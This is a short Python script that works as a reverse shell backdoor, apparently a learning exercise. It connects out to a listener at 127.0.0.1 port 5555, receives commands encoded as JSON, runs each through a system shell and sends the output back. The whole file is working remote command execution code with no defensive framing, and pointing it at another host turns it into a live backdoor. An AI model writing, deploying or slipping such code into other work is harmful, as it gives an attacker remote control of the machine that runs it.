#! /usr/bin/python

import socket
import json
import subprocess

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recieve():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 5555))

def shell():
    while True:
        command = reliable_recieve()
        if command == "quit":
            break
        execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        reliable_send(result)

shell()
